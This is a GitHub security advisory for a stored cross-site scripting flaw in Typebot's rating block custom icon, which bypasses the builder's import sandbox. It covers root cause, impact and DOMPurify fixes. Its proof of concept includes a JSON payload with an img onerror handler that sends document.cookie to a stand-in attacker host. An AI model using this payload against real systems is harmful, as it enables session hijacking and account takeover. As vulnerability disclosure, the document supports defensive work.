# [H] Typebot has Stored XSS via Rating Block Custom Icon that Bypasses isUnsafe Sandbox in Builder Preview

## Summary
Severity: High
Advisory: GHSA-6m7c-xfhp-p9fh
CVE: CVE-2026-28445
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-26
Source: https://github.com/advisories/GHSA-6m7c-xfhp-p9fh
Type: github-advisory

## Affected
- npm: `@typebot.io/js` — affected >=0 <0.10.1

## Details
## Summary
The rating block's custom icon feature accepts arbitrary HTML/SVG via the `customIcon.svg` field and renders it using Solid's `innerHTML` directive without any sanitization. When a malicious typebot is imported or crafted by a workspace collaborator, the payload executes in the builder's DOM context (builder.typebot.io), bypassing the `isUnsafe` Web Worker sandbox that protects Script blocks during preview. This allows session hijacking and privilege escalation within the builder application.

## Severity
**High** (CVSS 3.1: 8.7)

`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`

- **Attack Vector:** Network — malicious typebot can be delivered via import/template sharing or crafted by a collaborator
- **Attack Complexity:** Low — payload is a trivial HTML injection, no special conditions required
- **Privileges Required:** Low — attacker needs either collaborator access to a workspace or the ability to distribute a typebot template
- **User Interaction:** Required — victim must preview the bot in the builder
- **Scope:** Changed — the vulnerable component (embed JS rating renderer) impacts the builder application's authentication context, a different security scope
- **Confidentiality Impact:** High — full access to builder session cookies, auth tokens, and API access
- **Integrity Impact:** High — can modify bots, workspace settings, or perform any action as the victim user
- **Availability Impact:** None — no denial of service vector

- **Builder preview context (CONFIRMED):** This is the real vulnerability. The rating block innerHTML bypasses the `isUnsafe` sandbox mechanism that protects against imported/untrusted Script blocks. The builder preview renders inline on the builder's origin with `'unsafe-inline'` CSP, giving the attacker full access to the victim's builder session.
- **Viewer/embed context (NOT incremental):** Bot creators already have intentional arbitrary JavaScript execution via Script blocks in production mode (`executeScript.ts:22-24`). The rating innerHTML does not provide additional capability in this context. This is by design — bot creators control what code runs in their published bots.

The adjusted severity reflects the builder-preview-specific impact, which is still High due to session hijacking potential on the privileged builder origin.

## Affected Component
- `packages/embeds/js/src/features/blocks/inputs/rating/components/RatingForm.tsx` — `RatingButton` component (lines 153-160)
- `apps/builder/src/features/typebot/helpers/sanitizers.ts` — `sanitizeBlock` function (lines 63-119) — missing rating block SVG sanitization

## CWE
- **CWE-79**: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

## Description

### Unsanitized innerHTML in Rating Block Custom Icon

The `RatingButton` component in the embeds JS package renders the custom icon SVG directly into the DOM via Solid's `innerHTML` directive with no sanitization:

```tsx
// packages/embeds/js/src/features/blocks/inputs/rating/components/RatingForm.tsx:153-160
<div
  class="flex justify-center items-center rating-icon-container"
  innerHTML={
    props.customIcon?.isEnabled && !isEmpty(props.customIcon.svg)
      ? props.customIcon.svg
      : defaultIcon
  }
/>
```

The `customIcon.svg` field is stored as a plain string with no content validation at any layer:

```typescript
// packages/blocks/inputs/src/rating/schema.ts:21-26
customIcon: z
  .object({
    isEnabled: z.boolean().optional(),
    svg: z.string().optional(),   // No sanitization — any HTML/JS accepted
  })
  .optional(),
```

### Inconsistent Defenses — DOMPurify Available But Not Used

The codebase is aware of innerHTML XSS risks. `StreamingBubble.tsx` uses `dompurify` to sanitize content before passing it to `innerHTML`:

```tsx
// packages/embeds/js/src/components/bubbles/StreamingBubble.tsx:2,28
import domPurify from "dompurify";
// ...
domPurify.sanitize(marked.parse(line, { breaks: true }), { ADD_ATTR: ["target"] })
```

DOMPurify is already a dependency of the embeds JS package. The rating block simply fails to use it.

### Bypass of the `isUnsafe` Sandbox Mechanism

The codebase has a safety mechanism for imported/untrusted bots. When a typebot is imported, `sanitizeGroups` is called with `enableSafetyFlags: true`:

```typescript
// apps/builder/src/features/typebot/api/handleImportTypebot.ts:121-128
const groups = (
  duplicatingBot.groups
    ? await sanitizeGroups(duplicatingBot.groups, {
        workspace,
        enableSafetyFlags,   // true for imports
      })
    : []
) as TypebotV6["groups"];
```

However, `sanitizeBlock` only flags Script and SetVariable blocks as `isUnsafe` — rating blocks pass through completely unmodified:

```typescript
// apps/builder/src/features/typebot/helpers/sanitizers.ts:70-82
const sanitizeBlock = async (block, { enableSafetyFlags, workspace }) => {
  if (!("options" in block) || !block.options) return block;

  if (enableSafetyFlags && block.type === LogicBlockType.SCRIPT) {
    return { ...block, options: { ...block.options, isUnsafe: true } };
  }
  if (enableSafetyFlags && block.type === LogicBlockType.SET_VARIABLE) {
    return { ...block, options: { ...block.options, isUnsafe: true } };
  }
  // Rating blocks with malicious customIcon.svg pass through here unchanged
  // ...
};
```

At runtime, unsafe Script blocks are sandboxed in a Web Worker during preview:

```typescript
// packages/embeds/js/src/features/blocks/logic/script/executeScript.ts:14-17
if (isPreview && isUnsafe) {
  const argsRecord = Object.fromEntries(args.map((a) => [a.id, a.value]));
  const result = await runUserCodeInWorker(code, argsRecord);
```

But the rating block's `innerHTML` executes directly in the builder's DOM — no Worker, no sandbox, no checks. This creates a complete bypass of the import safety mechanism.

### Builder Preview Executes on the Builder Origin

The builder preview renders the bot **inline** (not in an iframe) via a web component chain:

```
EditorPage → PreviewDrawer → WebPreview → <Standard /> (@typebot.io/react)
  → <typebot-standard> web component → Bot (Solid.js) → RatingForm → innerHTML
```

This means the malicious SVG/HTML executes with full access to the builder's DOM, cookies, and authentication context. The builder's CSP includes `'unsafe-inline'` for scripts:

```javascript
// apps/builder/next.config.mjs:79
`script-src 'self' 'unsafe-inline' 'unsafe-eval' blob: https:`
```

This permits inline event handlers like `onerror` to execute.

## Proof of Concept

### Attack Vector 1: Malicious Typebot Import (Primary)

1. Attacker crafts a typebot JSON file containing:
```json
{
  "groups": [{
    "blocks": [{
      "type": "rating input",
      "options": {
        "buttonType": "Icons",
        "customIcon": {
          "isEnabled": true,
          "svg": "<img src=x onerror=\"fetch('https://attacker.example/?c='+document.cookie)\">"
        }
      }
    }]
  }]
}
```

2. Attacker distributes the file (e.g., via community forums, template marketplace, or direct sharing).

3. Victim imports the typebot into their workspace.

4. Victim previews the bot in the builder. The rating block renders, triggering:
   - `onerror` fires because `src=x` fails to load
   - `fetch()` exfiltrates the victim's session cookies from the builder origin
   - Script blocks in the same bot would be sandboxed in a Worker due to `isUnsafe`, but the rating SVG bypasses this entirely

### Attack Vector 2: Malicious Workspace Collaborator

1. Collaborator with editor access modifies a rating block's custom icon SVG.
2. Workspace owner or admin previews the bot.
3. Attacker's payload executes in the admin's builder session.

## Impact

- **Session hijacking:** Attacker can exfiltrate authentication cookies and session tokens from the builder origin
- **Privilege escalation:** A collaborator with editor access can execute code in the session of workspace admins/owners
- **Sandbox bypass:** Completely circumvents the `isUnsafe` Web Worker sandbox designed to protect against imported/untrusted bots
- **Account takeover:** With stolen session tokens, the attacker can access the victim's full workspace, modify bots, access integrations, and view collected data
- **Defense inconsistency:** The codebase sanitizes innerHTML in `StreamingBubble.tsx` but not in `RatingForm.tsx`, indicating this is an oversight rather than a design choice

## Recommended Remediation

### Option 1: Sanitize with DOMPurify at the rendering layer (Preferred)

Apply the same DOMPurify sanitization pattern already used in `StreamingBubble.tsx`. This protects all paths regardless of where the data originates:

```tsx
// packages/embeds/js/src/features/blocks/inputs/rating/components/RatingForm.tsx
import domPurify from "dompurify";

// In the RatingButton component:
<div
  class="flex justify-center items-center rating-icon-container"
  innerHTML={
    props.customIcon?.isEnabled && !isEmpty(props.customIcon.svg)
      ? domPurify.sanitize(props.customIcon.svg)
      : defaultIcon
  }
/>
```

This is the preferred fix because it applies defense at the lowest layer, protecting all callers (builder preview, viewer, embeds).

### Option 2: Validate SVG content at the schema/API layer

Add SVG-specific validation in the Zod schema or in `sanitizeBlock`:

```typescript
// In sanitizers.ts sanitizeBlock function, add a case for rating blocks:
if (block.type === InputBlockType.RATING && block.options?.customIcon?.svg) {
  const cleanSvg = domPurify.sanitize(block.options.customIcon.svg, {
    USE_PROFILES: { svg: true },
  });
  return {
    ...block,
    options: {
      ...block.options,
      customIcon: { ...block.options.customIcon, svg: cleanSvg },
    },
  };
}
```

Note: This option alone is insufficient — it only protects data entering through the API, not data already in the database. Combine with Option 1 for defense-in-depth.

### Additional Recommendation: Audit other innerHTML usages

`FileUploadForm.tsx:234` also renders `props.block.options?.labels?.placeholder` via `innerHTML` without sanitization — this should be audited for the same vulnerability class.

## Credit
This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/baptisteArno/typebot.io/security/advisories/GHSA-6m7c-xfhp-p9fh
- https://nvd.nist.gov/vuln/detail/CVE-2026-28445
- https://github.com/baptisteArno/typebot.io/commit/474ecbf46bc47a75265bada2599f12b2179de375
- https://github.com/baptisteArno/typebot.io
- https://github.com/baptisteArno/typebot.io/blob/v3.16.0/packages/embeds/js/package.json
- https://github.com/baptisteArno/typebot.io/releases/tag/v3.16.0
